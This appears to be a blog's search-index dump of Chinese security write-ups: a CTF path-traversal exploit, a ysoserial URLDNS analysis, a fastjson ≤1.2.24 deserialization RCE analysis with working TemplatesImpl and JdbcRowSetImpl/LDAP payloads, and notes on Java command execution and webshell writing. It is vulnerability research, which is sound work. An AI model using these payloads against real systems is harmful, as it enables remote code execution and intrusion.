参考链接https://lihuaiqiu.github.io/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/https://paper.seebug.org/424/","link":"/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"网鼎杯线下半决赛 faka 题目复盘","text":"半决赛没有做出来，感觉有些遗憾。因此还是决定下来复盘一下。 情景再现比赛时的想法题目源码结构 其实在拿到源码时就不断揣测出题人的意图 题目中的 hint 也给到：www-data 权限用户可写目录只有 runtime 跟 static。所以当时就想好了审计的重点： 各类文件操作函数 + 写入路径可控 RCE + file_put_contents （如果真能RCE，貌似也不用写shell，直接读就行） SQLi 然后 html 下面给到了 1.txt 里面的信息是注册邀请码 当时还以为这么明显的提示一定是暗示什么（结果好像这个txt并没有什么用？），还以为是从index.php/register 利用注册码进去，然后打 /merchant。结果在 /merchant 找了半天也没找到漏洞点。 然后看到跟 html 同级目录下的 tk.sql。 当时找到了md5之后以为能进后台。但是现场还是断网环境（WTF？那我怎么解？）用常见弱密码单向生成后比对也没有发现有相同的。同时还不能爆破后台，也没什么万能密码这类的东西。 然后当时题目环境还是 tp5.0.14。RCE 貌似ban了好多函数。当时妄想通过非预期解一下题目。 最后还是坚信漏洞点在： /merchant 下面。一下午的时间就在 /merchant 的审计和 tp5 RCE 的绕过度过了… 赛后实验室的小伙伴 @jokuuy 告诉我后台部分功能点未授权 orz。而且之前他审过这个 CMS，据说10s可以秒掉23333 反思和小结当时没考虑到未授权…未授权的话可以直接利用很多后台的漏洞（当时就看到了manage/backup 那个点），但是没有进到后台。所以没有能够利用到manage 和 admin 两个目录下的代码。 题目分析获取后台权限http://wdb-vul/index.php/admin/index/info 未授权添加用户 之后访问某些存在漏洞的路由会发生这样的情况 提示权限不够。 在 SQL 列中，authorize 起到了权限限制的作用 回溯 authorize 的控制 application/admin/controller/Index.php#info 跟进 _form， callback 调用 _form_filter 跟进 _form_filter 说明直接 POST 参数即可。 任意文件读取application/manage/controller/Backup.php#downloadBak finename可控，目录穿越 Exp: http://wdb-vul/index.php/manage/backup/downloadBak?file=../../../../../../../../../Users/p2hm1n/Desktop/flag 文件上传发现先知已经有师傅写了一个文件上传的漏洞点了 https://xz.aliyun.com/t/7838 跟着复现分析一波。 application/admin/controller/Plugs.php 主要是文件上传的一些校验。 上传的时候会先调用 upstate，主要作用如下： 将通过 POST 传入的 md5 值以16位字母为间隔进行分割，并拼接传入filename 的后缀 检测文件是否上传 生成 config 数组，并添加每一个键的值 之后调用 upload ，这里看文件上传处理的位置 跟进 move 跟进 buildSaveName final POC 上传至 static 目录","link":"/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/"},{"title":"ysoserial URLDNS 调试分析","text":"以 URLDNS 作为 ysoserial 调试分析的开端，调试环境 JDK 1.8 About URLDNSURLDNS 适用环境： 不依赖第三方库 对无回显反序列化处通过 DNS 请求验证反序列化 执行效果： 不执行命令，只发起一次 DNS 请求 大致浏览其功能后归纳出以下几个问题： URLDNS 是怎么发起 DNS 请求的 为什么能在一个反序列化利用点发起攻击，ysoserial 是怎么做的 这种攻击和之前学的反序列化的重写 readObject 有什么区别 下面进入分析流程 URLDNS POC AnalyseCodeysoserial 给的利用链如下 * Gadget Chain:* HashMap.readObject()* HashMap.putVal()* HashMap.hash()* URL.hashCode() ysoserial Code： public class URLDNS implements ObjectPayload&lt;Object&gt; { public Object getObject(final String url) throws Exception { URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); URL u = new URL(null, url, handler); ht.put(u, url); Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); return ht; } 由于 ysoserial 除了核心利用代码之外涉及很多 ysoserial 工具本身的东西。因此把代码扣出来调试。 这里引用 @啦啦0咯咯 师傅文中代码 package ysoserial;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNS { public static void main(String[] args) throws Exception { // 创建一个键的类型为 URL， 值的类型为 String 的 hashMap HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); // 上面泛型规定了键的类型，创建一个 URL 类 URL url = new URL(&quot;http://3n5nmt.dnslog.cn&quot;); // hashCode是private修饰，因此反射调用 URL 类的成员变量 Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); // 修改权限 f.setAccessible(true); // 0xdeadbeef 随便设置 f.set(url, 0xdeadbeef); // URLDNS 随便设置 hashMap.put(url, &quot;URLDNS&quot;); f.set(url, -1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject(); }} Analyse -DNS首先回顾这个 POC 的功能 —— 发起 DNS 请求 那么纵观代码可以发现的是除了 ois.readObject(); 之外没有其他的敏感操作了。 思考一下 Java 反序列化漏洞的核心我们不难得知，这段代码一定重写了 readObject。那么向上追溯是哪里重写了 readObject 呢？ java.util.HashMap#readObject 中 putVal(hash(key), key, value, false, false); 这里主要关注 (hash(key) java.util.HashMap#hash 操作意义具体看：https://www.zhihu.com/question/20733617 主要跟进 key.hashCode() java.net.URL#hashCode 这里对 hashCode 有一个判断，要为 -1 才能去触发下面的语句 后续进入 handler.hashCode(), handler 来源于 transient URLStreamHandler handler; java.net.URLStreamHandler#hashCode 这里触发关键的方法 getHostAddress java.net.URLStreamHandler#getHostAddress 这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址。所以变相等于了DNS查询 后面为更深的调用栈 Analyse - hashcode这里主要分析 POC 这段代码 f.set(url, 0xdeadbeef);hashMap.put(url, &quot;URLDNS&quot;);f.set(url, -1); 核心是一个 hashCode 在不同场景下值的问题 控制变量法：先把 f.set(url, 0xdeadbeef); 删除 // URLDNS POCpublic class URLDNS { ··· hashMap.put(url, &quot;URLDNS&quot;);/*** java.util.HashMap#put** 这里关注下面的代码*/public V put(K key, V value) { return putVal(hash(key), key, value, false, true);}/*** java.util.HashMap#hash** 这里关注下面的代码** 可见到了之前分析触发 DNS 的代码*/static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);}/*** java.util.HashMap#hash** 这里 hashCode 为 -1，会触发后续的调用*/public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;}/*** java.net.URLStreamHandler#hashCode** 这里 hashCode 为 -1，会触发后续的调用*/protected int hashCode(URL u) { ··· // Generate the host part. InetAddress addr = getHostAddress(u);/*** java.net.URLStreamHandler#getHostAddress** 这里触发 DNS 请求 ！ 但注意！！！ 这里仅仅是在构造的时候触发的 DNS 请求** 并非反序列化过程中触发！并非反序列化过程中触发！并非反序列化过程中触发！*/protected synchronized InetAddress getHostAddress(URL u) { ··· u.hostAddress = InetAddress.getByName(host); 经过上面的分析我们知道 f.set(url, 0xdeadbeef); 的作用就是避免在生成 POC 的时候触发额外的 DNS 请求，影响我们对反序列化漏洞验证的判断 以我刚刚的例子为例，先看一下此时的 hashCode 接着我们刚刚的分析，再进行控制变量法：把 f.set(url, -1); 删除 直接跳到关键地方，可以看到这里并不为 -1 因此不会进入后续触发 DNS 请求的语句 因此我们得出结论：f.set(url, -1); 的关键作用是控制 hashCode 为 -1 ，从而触发后续 DNS 请求 Analyse - ysoserial POCysoserial 中相比于之前单纯的 POC，利用了一个独特的对象 URLStreamHandler handler = new SilentURLStreamHandler(); 跟进 ysoserial.payloads.URLDNS.SilentURLStreamHandler static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; }}} 通过重写 getHostAddress 的方式去避免在生成 POC 的时候发出 DNS 请求 Referencehttps://www.anquanke.com/post/id/201762 https://payloads.info https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w","link":"/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"title":"fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析","text":"本篇从多个维度深入分析 fastjson ≤ 1.2.24 反序列化 RCE 漏洞及相关利用链 About fastjsonfastjson是阿里巴巴的开源JSON解析库，主要作用是在 JSON 格式和 JavaBean 之间进行转换 fastjson反序化列框架图如下 关于 fastjson 漏洞版本关于网上有些文章写到最初 fastjson 利用版本为 1.2.22-1.2.24，我对此很疑惑，因为翻看官网的安全公告-security_update_20170315，里面提到了影响版本是 1.2.24以及之前版本，因此不太清楚 1.2.22 这个版本的来源 最近发现fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，为了保证系统安全，请升级到1.2.28/1.2.29/1.2.30/1.2.31或者更新版本。 最终经过 Maven 不停的切换测试以及fastjson wiki的寻找，发现了 fastjson 的这次更新，里面涉及到了的关于 NonPublicField 的反序列化的改动，具体是在 1.2.22 及以上支持，而用到这一点的应该就只有 TemplatesImpl 利用链，下面的 JdbcRowSetImpl 利用链是不受影响的 序列化与反序列化从上图 JSON 模块可以看出来一般我们会用到几个方法 序列化 toJSONString() 反序列化 JSON.parseObject()：返回的是 JSONObject JSON文本解析成 JSONObject 类型：JSON.parseObject(&quot;{...}&quot;); JSON文本解析成 Demo.class 类：JSON.parseObject(&quot;{...}&quot;, Demo.class); JSON.parse()：返回的是实际类型的对象 以下demo 测试以 fastjson 1.2.24 为例 测试流程参考：https://paper.seebug.org/1192/ 深入方法差异，原文总结的已经很好了，这里引用原文的结论： JSON.parse(serializedStr) 在指定了@type 的情况下，自动调用了 User 类默认构造器，User类对应的 setter 方法（setAge，setName），最终结果是 User类的一个实例 &lt;= 1.2.25 autotype默认开启 不过值得注意的是 public sex 被成功赋值了，private address 没有成功赋值，不过在1.2.22, 1.1.54.android之后，增加了一个 SupportNonPublicField 特性，如果使用了这个特性，那么 private address就算没有setter、getter也能成功赋值，这个特性也与后面的一个漏洞有关 注意默认构造方法、setter方法调用顺序，默认构造器在前，此时属性值还没有被赋值，所以即使默认构造器中存在危险方法，但是危害值还没有被传入，所以默认构造器按理来说不会成为漏洞利用方法，不过对于内部类那种，外部类先初始化了自己的某些属性值，但是内部类默认构造器使用了父类的属性的某些值，依然可能造成危害 JSON.parseObject(serializedStr) 在指定了 @type 的情况下，自动调用了User类默认构造器，User 类对应的 setter 方法（setAge，setName）以及对应的 getter 方法（getAge，getName），最终结果是一个字符串 这里还多调用了getter（注意bool类型的是 is 开头的）方法，是因为parseObject 在没有其他参数时，调用了JSON.toJSON(obj)，后续会通过 gettter 方法获取obj属性值： JSON.parseObject(serializedStr, Object.class) 从结果可以看出在指定了 @type 的情况下，这种写法和第一种JSON.parse(serializedStr)写法没有区别 JSON.parseObject(serializedStr, User.class) 在指定了 @type 的情况下，自动调用了 User 类默认构造器，User 类对应的 setter 方法（setAge，setName），最终结果是 User 类的一个实例 这种写法明确指定了目标对象必须是 User 类型，如果 @type 对应的类型不是 User 类型或其子类，将抛出不匹配异常，但是，就算指定了特定的类型，依然有方式在类型匹配之前来触发漏洞 setter 跟 getter 的限制通过前面的测试我们证明 fastjson 有在反序列化中调用 getter、setter、is 方法的特性，但是通过源码分析，其实这个调用是有限制的 先看 setter 的限制 com.alibaba.fastjson.util.JavaBeanInfo#build 方法名长度 ≥ 4 非静态方法 返回类型等于void类型或当前类 方法名以set开头 参数个数为1 再看 getter 的限制 方法名长度 ≥ 4 非静态方法 以get开头且第4个字母为大写 无传入参数 返回值类型继承自 Collection Map AtomicBoolean AtomicInteger AtomicLong` RCE demo根据其 fastjson 的反序列化特性，我理解的 fastjson 反序列化攻击面的是在反序列化过程中调用这些 getter、setter、is 方法，而这些方法中往往有一些敏感的操作，可以被直接利用或者作为利用链的一部分来调用 因此我们可以人为构造一个恶意 demo public class CalcDemo { public static void main(String[] args) { String jsonDemo = &quot;{\\&quot;@type\\&quot;:\\&quot;com.p2hm1n.fastjsondemo.UserCalc\\&quot;, \\&quot;name\\&quot;:\\&quot;zhangsan\\&quot;}&quot;; System.out.println(jsonDemo.getClass()); Object obj = JSON.parseObject(jsonDemo); System.out.println(obj); }}class UserCalc { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; try { Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;); } catch (IOException e) { e.printStackTrace(); } }} 上述的demo是我们构造的 setter 方法里直接有敏感操作的，下面我们谈一些关于利用链的 需要注意的是 fastjson 1.2.24及之前没有任何防御，并且autotype默认开启 其中主要有两个利用链 JNDI：com.sun.rowset.JdbcRowSetImpl JDK7u21：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl TemplatesImpl 利用链利用条件回顾我们 fastjson 在反序列化中调用 getter、setter、is 方法的特性，在无getter、setter方法的时候，NonPublicField 不会被反序列化，如果想要将其反序列化的话需要用到 SupportNonPublicField 这个 Feature，也就对应了上面的 1.2.22 版本改动，相应的实现如下 JSON.parseObject(input, Object.class, Feature.SupportNonPublicField); JSON.parse(text1, Feature.SupportNonPublicField); JDK 限制为 1.7 全版本，1.8下部分版本也是可以成功的，这里我没展开测试 对应 JDK7u21 的利用链也用到了 TemplatesImpl，但是 7u21 的修复点并不是这里，而是在之后的 AnnotationInvocationHandler，具体可以参看之前的文章，因此这个利用链应该是影响 JDK1.7的 利用链分析反序列化利用链前面调用的都是 JDK7u21 利用链，这里直接将之前的 RCE demo 搬过来 public class JDemo { public static void main(String[] args) throws Exception { // javassist fake Code templates.getOutputProperties(); } 首先看 getOutputProperties，是满足了 fastjson 调用 getter 的要求的，那么解决一下利用条件里面的 Feature.SupportNonPublicField 的来历 根据其 TemplatesImpl 的源码可以发现这个变量为 private，因此需要利用到这个 Feature 去实现 NonPublicField 的反序列化 那么可以发现这里的变量名是带了 _ 的，是否会调用 getOutputProperties ？ 跟进 fastjson 源码对其变量的处理，这里会去除掉 _ javassist 里面生成的 payload 在 7u21 的链中主要限制条件如下，具体分析见前文 _bytecodes 类为 AbstractTranslet 的子类 _name != null _class == null _tfactory 的值的对象需要拥有 getExternalExtensionsMap 方法 在 fastjson 中，由于 fastjson 源码中会对一些变量进行处理，因此 javassist 所构造的内容可能会有所不同 先看对_tfactory 的处理，7u21 链中由于需要调用 getExternalExtensionsMap 方法，因此 _tfactory 对象需要经过特殊构造 但是在 fastjson 中我们可以直接将其置为空，可以看一下相关的处理 这里会进行一个判断，如果其为空的话就创建一个实例 那么根据其 _tfactory 对象的定义，是有相应的方法的 private transient TransformerFactoryImpl _tfactory = null; 再看一下对 _bytecodes 的处理 com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze 这里调用 bytesValue 方法 com.alibaba.fastjson.parser.JSONScanner#bytesValue 这里对应进行 base64 解码 final POC public class TemplatesImplDemo { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;TestDemo&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); String b64_targetByteCodes = Base64.encodeBase64String(classBytes); // format final String type_class = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String myPOC = &quot;{&quot;+ &quot;\\&quot;@type\\&quot;:\\&quot;&quot; + type_class +&quot;\\&quot;,&quot;+ &quot;\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+b64_targetByteCodes+&quot;\\&quot;],&quot;+ &quot;&apos;_name&apos;:&apos;TestDemo&apos;,&quot;+ &quot;&apos;_tfactory&apos;:{},&quot;+ &quot;&apos;_outputProperties&apos;:{}&quot;+ &quot;}\\n&quot;; System.out.println(myPOC); }} JdbcRowSetImpl 利用链利用条件JdbcRowSetImpl 利用链通用性很强，适用于以下 JSON 反序列化方式 JSON.parse(evil);JSON.parseObject(evil);JSON.parseObject(evil, Object.class); 受限同 JNDI 注入 JDK 版本限制相同 JDK 5u45、6u45、7u21、8u121 开始 java.rmi.server.useCodebaseOnly 默认配置为true JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为false JDK 11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase 默认为false 利用链分析核心原理就是 setter 的调用，因此我们可以实现一个 Level-0 RCE demo public class JdbcDemo { public static void main(String[] args) throws SQLException { JdbcRowSetImpl calcDemo = new JdbcRowSetImpl(); calcDemo.setDataSourceName(&quot;ldap://127.0.0.1:1389/Calc&quot;); calcDemo.setAutoCommit(true); }} 恶意类 import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.io.IOException;import java.util.Hashtable;public class Calc implements ObjectFactory { @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception { Runtime.getRuntime().exec(&quot;open -a Calculator&quot;); return null; } public static void main(String[] args) { try { Runtime.getRuntime().exec(&quot;open -a Calculator&quot;); } catch (IOException e) { e.printStackTrace(); } }} 分析一下调用过程 首先 setAutoCommit 会调用 connect 后续在 com.sun.rowset.JdbcRowSetImpl#connect 中 lookup 可控，造成了 JNDI 注入，随后的调用链为 JNDI 的调用链 跟进 getDataSourceName 向上追溯 dataSource 的附值，其来源于 javax.sql.rowset.BaseRowSet#setDataSourceName，也就是我们 POC 里的 setDataSourceName 最后可以转换成 fastjson 的 POC {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/#Calc&quot;, &quot;autoCommit&quot;:true} 留疑：https://wx.zsxq.com/dweb2/index/topic_detail/15555884828822","link":"/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"浅析 Java 命令执行","text":"对 Java 命令执行过程中的流程以及利用坑点进行学习分析 PrefaceJava 的大多数攻击的最后调用都在命令执行这个地方，而命令执行涉及的方方面面还是大有可深究 本文从以下几个维度分析 Java 命令执行 How to Command execution How to getshell How to Command execution首先谈一下 Java 当中究竟有哪些方式可以进行命令执行 java.lang.Runtime#exec() java.lang.ProcessBuilder#start() java.lang.ProcessImpl#start() 更多（如 JNI 调用动态链接库、Unsafe 类、defineClass() 等，不在本文探讨范围） java.lang.Runtime#exec()先看一下源码 首先 java.lang.Runtime 是一个单例模式，它不能被实例化，只能通过 getRuntime 获得对象，具体可参考: 单例模式 看一个最简单的命令执行的例子 package exec;import java.io.IOException;public class ExecDemo00 { public static void main(String[] args) throws IOException { Process procdemo = Runtime.getRuntime().exec(&quot;open -a calculator&quot;); }} 成功弹出了计算器，那么其实在命令执行的更多利用方式上，光弹一个计算器是不够的 因为我们在很多场景下需要其回显功能 由此一般的命令执行代码如下； package exec;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class ExecDemo01 { public static void main(String[] args) throws IOException { /** * 获取 Process 类 */ Process procexec = Runtime.getRuntime().exec(&quot;whoami&quot;); /** * 获取输入流、子进程标准输出 */ InputStream ins = procexec.getInputStream(); /** * 创建 ByteArrayOutputStream 缓冲区 */ ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] bytes = new byte[1024]; int size; /** * ins.read(bytes) 从输入流中读取一定数量的字节，并将其存储到缓冲区数组中 bytes * 返回值：读入缓冲区的总字节数，或者 -1 由于到达流的末尾而没有更多数据。 */ while ((size = ins.read(bytes)) &gt; 0 ){ /** * 将 size 指定字节数组中从偏移量开始的字节写入此数组输出流 */ bos.write(bytes, 0, size); } /** * 通过解码字节将缓冲区内容转换为字符串。 */ System.out.println(bos.toString()); }} 那么为什么上述代码能够获取回显呢？ 先回顾一下 Runtime.exec() 的作用。其实命令执行只是我们对结果的一个统称。那么它其实真正的作用是： 创建一个本地进程，并返回Process子类的一个实例，该实例可用来控制进程并获取相关信息。 对比一下之前的例子，我们发现其实关键出现在 getInputStream 这里 那么我们发现其实 getInputStream是 Process 类的API 之后创建 ByteArrayOutputStream 然后转换出来即可 网上很多文章说这里的getInputStream 的作用就只说了一个获取输入流，之前很困惑为什么获取输入流可以获取命令执行的结果，不太理解输入流跟命令执行输出的关系，后来看了下官方文档，发现官方文档的返回值写的很清楚大概这里的输入流不是字面意思上的理解的那种，反正会获取子流程正常输出内容就对了 看一下官方的定义 getInputStream public abstract InputStream getInputStream() Returns the input stream connected to the normal output of the subprocess. The stream obtains data piped from the standard output of the process represented by this Process object. If the standard output of the subprocess has been redirected using ProcessBuilder.redirectOutput then this method will return a null input stream. Otherwise, if the standard error of the subprocess has been redirected using ProcessBuilder.redirectErrorStream then the input stream returned by this method will receive the merged standard output and the standard error of the subprocess. Implementation note: It is a good idea for the returned input stream to be buffered. Returns: the input stream connected to the normal output of the subprocess 那么联想到 Weblogic 2725 的获取回显的思路也是在 Weblogic中获取到当前线程类，然后定位到输出类，最后获取的回显信息。 java.lang.ProcessBuilder#start() ProcessBuilder是一个final类，Process是一个抽象类。ProcessBuilder.start() 和 Runtime.exec() 方法都被用来创建一个操作系统进程（执行命令行操作），并返回 Process 子类的一个实例，该实例可用来控制进程状态并获得相关信息。 ProcessBuilder.start() 只支持字符串数组参数，且 第一个参数必须是可执行程序，可以添加参数使用{&quot;cmd&quot;, &quot;/c&quot;} 或 {&quot;/bin/bash&quot;, &quot;-c&quot;} package exec;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class ExecDemo02 { public static void main(String[] args) throws IOException { String[] cmds = {&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;whoami&quot;}; Process procexec = new ProcessBuilder(cmds).start(); InputStream ins = procexec.getInputStream(); ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] bytes = new byte[1024]; int size; while ((size = ins.read(bytes)) &gt; 0 ){ bos.write(bytes, 0, size); } System.out.println(bos.toString()); }} java.lang.ProcessImpl通过之前的图我们也可以知道 java.lang.ProcessImpl 是更为底层的实现。 特点是不能直接调用，需要通过反射去间接调用 package exec;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Map;public class ExecDemo03 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException { String[] cmds = {&quot;whoami&quot;}; Class clz = Class.forName(&quot;java.lang.ProcessImpl&quot;); Method method = clz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); Process procexec = (Process) method.invoke(null,cmds, null, &quot;.&quot;, null, true); InputStream ins = procexec.getInputStream(); ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] bytes = new byte[1024]; int size; while ((size = ins.read(bytes)) &gt; 0 ){ bos.write(bytes, 0, size); } System.out.println(bos.toString()); }} How to getshell by java.lang.Runtime#exec()getshelljava.lang.Runtime#exec() 作为 Java 里最常见进行命令执行的方法。我们下文探究如何通过其进行 getshell wget 或者 curl 下载文件 echo 写入webshell String[] cmdarray String command + base64encode wget and curl 优势 操作便捷 可以下载可执行文件 缺陷 受限于网络环境 wget Runtime.getRuntime().exec(&quot;wget https://p2hm1n.com/images/logo.png&quot;); curl Runtime.getRuntime().exec(&quot;curl -O https://p2hm1n.com/images/logo.png&quot;); String[] cmdarray 优势 相比于 wget / curl 不受限于网络环境 缺陷 兼容性较差，比如有的系统固定命令执行方式 前提：getshell的过程中需要写入 webshell，而写入 Webshell 的命令形如 echo &quot;flag&quot; &gt; flag.txt 但是利用 java.lang.Runtime#exec(String command) 直接执行无法写入文件 Runtime.getRuntime().exec(&quot;echo \\&quot;flag\\&quot; &gt; flag.txt&quot;); 如果想写入文件的话，需要使用如下命令 // linuxRuntime.getRuntime().exec(new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo \\&quot;flag\\&quot; &gt; flag.txt&quot;});// windowsRuntime.getRuntime().exec(new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;echo \\&quot;flag\\&quot; &gt; flag.txt&quot;}); 究其原因 java.lang.Runtime 中其实有 6 个 exec 的重载方法 查了下官方文档，大概如下： /** * 在单独的进程中执行指定的字符串命令 */public Process exec(String command) throws IOException/** * 在具有指定环境的单独进程中执行指定的字符串命令 */public Process exec(String command, String[] envp) throws IOException/** * 在具有指定环境和工作目录的单独进程中执行指定的字符串命令 */public Process exec(String command, String[] envp, File dir) throws IOException/** * 在单独的进程中执行指定的命令和参数。 */public Process exec(String[] cmdarray) throws IOException/** * 在具有指定环境的单独进程中执行指定的命令和参数 */public Process exec(String[] cmdarray, String[] envp) throws IOException/** * 在具有指定环境和工作目录的单独进程中执行指定的命令和参数 */public Process exec(String[] cmdarray, String[] envp, File dir) throws IOException 下面进行命令执行解析流程分析： 首先分析 Runtime.getRuntime().exec(&quot;echo \\&quot;flag\\&quot; &gt; flag.txt&quot;); 首先将命令完全传给了 command 参数，返回值形如 exec(command, null, null); 这一步传入的参数为 command，跟进分析 经过如下处理： java.util.StringTokenizer#StringTokenizer(java.lang.String)-&gt; java.util.StringTokenizer#StringTokenizer(java.lang.String, java.lang.String, boolean) -&gt; java.util.StringTokenizer#setMaxDelimCodePoint-&gt;java.util.StringTokenizer#countTokens 最后转换成了 cmdarray。将原本传入的参数值进行了切割，转换成了数组，最后再次调用 exec 重载方法 调用到 java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)。后续调用 java.lang.ProcessBuilder#start 来进行命令执行 知识点一： java.lang.Runtime 中 6个 exec 的重载方法根据参数不同进行区分，主要是传入字符串跟数组两种形式，但最终调用都在java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File) 这里，该函数内部首先调用ProcessBuilder类的构造函数创建ProcessBuilder对象，然后调用start()，最终返回一个Process对象。 知识点二： Runtime#exec()底层还是调用的ProcessBuilder#start()，且传入构造函数的参数要求是数组类型。所以传给Runtime#exec()的命令字符串需要先使用StringTokenizer类分割为数组再传入ProcessBuilder类 这里同时解释了命令执行的底层关系，以及解释了 ProcessBuilder#start() 传入参数值的问题。但似乎还没有解决我们之前遗留的写入 webshell 的问题。 到这里先暂停一下。因为我们知道 Runtime#exec()底层还是调用的 ProcessBuilder#start()。所以我们的变量控制的范围应该在这里先停下。 因为我们得知道 ProcessBuilder#start() 需要什么样的命令格式，我们才能去控制 Runtime#exec 的参数去调整，又因为 ProcessBuilder#start() 最后会调用到 ProcessImpl.start() 我们看一下以下三种情况传入到 ProcessImpl.start() 的状态 Runtime.getRuntime().exec(&quot;echo echo flag &gt; flag.txt&quot;); Runtime.getRuntime().exec(&quot;/bin/sh -c echo flag &gt; flag.txt&quot;); Runtime.getRuntime().exec(new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo flag &gt; flag.txt&quot;}); 着重看第三种方法 这里可以发现是直接 return 到 java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File) 的 然后直接进行后面的调用 划重点：不会经过 StringTokenizer 进行字符串处理 经过实验我们知道只有 第三种 是可以输出到一个文件的，究其核心原因在于 StringTokenizer 对字符串的分割破坏了原有的语义，而直接传入数组类型字符串则由自己分割字符串 而第一种不能直接执行的原因是因为 Linux 下执行命令前面需要加上 /bin/sh -c，详见后面分析。 回到我们的分析，之前的分析已经调用到 ProcessImpl.start() 了 java.lang.Process 里这里有一个操作： 取出 cmdarray[0] 赋值给prog,如果安全管理器 SecurityManager 开启,会调用SecurityManager#checkExec()对执行程序prog进行检查 跟据注释可以看到这段代码的用途 ： Throws IndexOutOfBoundsException if command is empty 随后返回一个 new UNIXProcess() 针对第一个参数的处理在 java.lang.ProcessImpl#toCString 针对除第一个参数之外的处理在之前就已经完成 之后调用到 java.lang.UNIXProcess#UNIXProcess 这里还会调用 forkAndExec 方法，这个方法是一个 native 方法（会调用 C 语言之类的） 看一下此时的参数分割 在开发者的眼中prog是要执行的命令, argBlock都是传给 prog 的参数。 可见经过 StringTokenizer 对字符串中空格类的处理其实是一种java对命令执行的保护机制，他可以防御以下这种命令注入 &gt;String cmd = &quot;echo &quot; + 可控点;&gt;Runtime.getRuntime().exec(cmd) 题外话：站在开发的角度来看这也确实是 Java 相比 PHP 在防止命令注入的场景天然的优势了 启动了一个 sh 进程 那第二种为什么不行呢，看一下第二种的参数分割。 依照我的理解：既然 argBlock 是传递给 prog 的参数，所以当 echo 后面的东西分快传播就会破坏原来的语义，因此不能正常解析 （我也不知道这样理解对不对 ） 这样虽然也能启一个sh进程，但由于不能正常解析，所以不会写入文件 而第一个方法显然不能启动一个 sh 进程，因此在 Linux 下第一个传入的参数需要为 /bin/sh，所以第一种不行。 关于 Windows 的分析可以参考 360BugCloud 的《浅析Java命令执行》： 需要添加cmd /c的原因: 在传入 echo_test &gt; echo.txt 命令字符串时，出现错误(“java.io.IOException: Cannot run program “echo”: CreateProcess error=2, 系统找不到指定的文件。”)。原因是echo为命令行解释器cmd.exe的内置命令，并不是一个单独可执行的程序(如下图)，所以如果想执行echo命令写文件需要先启动cmd.exe，然后将echo命令做为cmd.exe的参数进行执行。 另外关于cmd下的 /c 